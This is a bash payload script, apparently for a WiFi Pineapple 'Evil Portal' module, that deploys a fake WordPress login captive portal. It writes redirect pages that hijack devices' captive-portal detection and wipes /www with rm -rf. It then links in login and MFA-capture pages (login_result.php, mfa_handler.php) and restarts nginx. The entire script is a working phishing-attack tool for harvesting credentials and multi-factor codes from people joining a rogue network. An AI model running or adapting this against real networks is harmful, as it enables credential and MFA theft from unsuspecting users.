#!/bin/bash
# Name: WordPress Portal
# Description: Activates the WordPress captive portal template
# Author: PentestPlaybook
# Version: 1.5
# Category: Evil Portal

# ====================================================================
# Configuration - Auto-detect Portal IP
# ====================================================================
if ip addr show br-evil 2>/dev/null | grep -q "10.0.0.1"; then
    PORTAL_IP="10.0.0.1"
else
    PORTAL_IP="172.16.52.1"
fi

LOG "Detected Portal IP: ${PORTAL_IP}"

# Get the directory where the payload is located
PAYLOAD_DIR="/root/payloads/user/evil_portal/wordpress_portal"
PORTAL_DIR="/root/portals/Wordpress"

# ====================================================================
# STEP 0: Verify Evil Portal is Installed
# ====================================================================
LOG "Step 0: Verifying Evil Portal is installed..."

if [ ! -f "/etc/init.d/evilportal" ]; then
    LOG "ERROR: Evil Portal is not installed"
    LOG "Please run the 'Install Evil Portal' payload first"
    exit 1
fi

LOG "SUCCESS: Evil Portal is installed"

# ====================================================================
# STEP 1: Backwards Compatibility Check
# ====================================================================
LOG "Step 1: Checking for backwards compatibility..."

if [ -d "/root/portals/Wordpress" ] && [ ! -d "/root/portals/Default" ]; then
    LOG "Detected legacy installation: Wordpress exists but Default does not"
    LOG "Renaming /root/portals/Wordpress to /root/portals/Default..."
    mv /root/portals/Wordpress /root/portals/Default
    
    # Create captive portal detection files for the renamed Default portal
    cat > "/root/portals/Default/generate_204.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/">
    <script>window.location.href="http://${PORTAL_IP}/";</script>
</head>
<body>
    <a href="http://${PORTAL_IP}/">Sign in to network</a>
</body>
</html>
EOF

    cat > "/root/portals/Default/hotspot-detect.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/">
    <script>window.location.href="http://${PORTAL_IP}/";</script>
</head>
<body>
    <a href="http://${PORTAL_IP}/">Sign in to network</a>
</body>
</html>
EOF

    LOG "SUCCESS: Legacy portal backed up to Default with detection files"
fi

# ====================================================================
# STEP 2: Verify Payload Files Exist
# ====================================================================
LOG "Step 2: Verifying payload files..."

if [ ! -d "${PAYLOAD_DIR}/files" ]; then
    LOG "ERROR: files/ directory not found in payload directory"
    exit 1
fi

if [ ! -f "${PAYLOAD_DIR}/files/index.php" ]; then
    LOG "ERROR: index.php not found in files/ directory"
    exit 1
fi

LOG "SUCCESS: Payload files verified"

# ====================================================================
# STEP 3: Create Wordpress Portal Directory
# ====================================================================
LOG "Step 3: Setting up Wordpress portal directory..."

mkdir -p "${PORTAL_DIR}/images"
mkdir -p "${PORTAL_DIR}/wp-includes/fonts"

# Copy all files from payload files/ directory
cp "${PAYLOAD_DIR}/files/"*.php "${PORTAL_DIR}/"
cp "${PAYLOAD_DIR}/files/"*.html "${PORTAL_DIR}/"
cp "${PAYLOAD_DIR}/files/"*.css "${PORTAL_DIR}/"
cp "${PAYLOAD_DIR}/files/"*.js "${PORTAL_DIR}/"
cp "${PAYLOAD_DIR}/files/"*.ep "${PORTAL_DIR}/" 2>/dev/null

# Copy images
cp "${PAYLOAD_DIR}/files/images/"* "${PORTAL_DIR}/images/"

# Copy fonts
cp "${PAYLOAD_DIR}/files/wp-includes/fonts/"* "${PORTAL_DIR}/wp-includes/fonts/"

LOG "SUCCESS: Portal files copied"

# ====================================================================
# STEP 4: Create Captive Portal Detection Files
# ====================================================================
LOG "Step 4: Creating captive portal detection files..."

cat > "${PORTAL_DIR}/generate_204.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/">
    <script>window.location.href="http://${PORTAL_IP}/";</script>
</head>
<body>
    <a href="http://${PORTAL_IP}/">Sign in to network</a>
</body>
</html>
EOF

cat > "${PORTAL_DIR}/hotspot-detect.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/">
    <script>window.location.href="http://${PORTAL_IP}/";</script>
</head>
<body>
    <a href="http://${PORTAL_IP}/">Sign in to network</a>
</body>
</html>
EOF

LOG "SUCCESS: Detection files created"

# ====================================================================
# STEP 5: Activate Portal via Symlinks
# ====================================================================
LOG "Step 5: Activating Wordpress portal via symlinks..."

# Clear /www
rm -rf /www/*

# Create symlinks for PHP files
ln -sf "${PORTAL_DIR}/index.php" /www/index.php
ln -sf "${PORTAL_DIR}/helper.php" /www/helper.php

# Create symlinks for HTML files
ln -sf "${PORTAL_DIR}/login.html" /www/login.html
ln -sf "${PORTAL_DIR}/login_error.html" /www/login_error.html
ln -sf "${PORTAL_DIR}/mfa.html" /www/mfa.html
ln -sf "${PORTAL_DIR}/mfa_failed.html" /www/mfa_failed.html
ln -sf "${PORTAL_DIR}/success.html" /www/success.html

# Create symlinks for PHP handlers
ln -sf "${PORTAL_DIR}/login_result.php" /www/login_result.php
ln -sf "${PORTAL_DIR}/mfa_handler.php" /www/mfa_handler.php
ln -sf "${PORTAL_DIR}/mfa_result.php" /www/mfa_result.php
ln -sf "${PORTAL_DIR}/mfa_status.php" /www/mfa_status.php

# Create symlinks for captive portal detection
ln -sf "${PORTAL_DIR}/generate_204.html" /www/generate_204
ln -sf "${PORTAL_DIR}/hotspot-detect.html" /www/hotspot-detect.html

# Create symlinks for static assets
ln -sf "${PORTAL_DIR}/wp-login.css" /www/wp-login.css
ln -sf "${PORTAL_DIR}/wp-scripts.js" /www/wp-scripts.js
ln -sf "${PORTAL_DIR}/images" /www/images
ln -sf "${PORTAL_DIR}/wp-includes" /www/wp-includes

# Restore captiveportal symlink
ln -sf /pineapple/ui/modules/evilportal/assets/api /www/captiveportal

LOG "SUCCESS: Portal activated via symlinks"

# ====================================================================
# STEP 6: Restart nginx
# ====================================================================
LOG "Step 6: Restarting nginx..."

nginx -t
if [ $? -ne 0 ]; then
    LOG "ERROR: nginx configuration test failed"
    exit 1
fi

/etc/init.d/nginx restart

LOG "SUCCESS: nginx restarted"

# ====================================================================
# Verification
# ====================================================================
LOG "Step 7: Verifying installation..."

if curl -s http://${PORTAL_IP}/ | grep -q "WordPress"; then
    LOG "SUCCESS: Wordpress portal is responding"
else
    LOG "WARNING: Portal may not be responding correctly"
fi

LOG "=================================================="
LOG "Wordpress Portal Activated!"
LOG "=================================================="
LOG "Portal URL: http://${PORTAL_IP}/"
LOG "Portal files: ${PORTAL_DIR}/"
LOG "Active via symlinks in: /www/"
LOG ""
LOG "To switch back to Default portal:"
LOG "  Run the 'Default Portal' payload"
LOG "=================================================="

exit 0
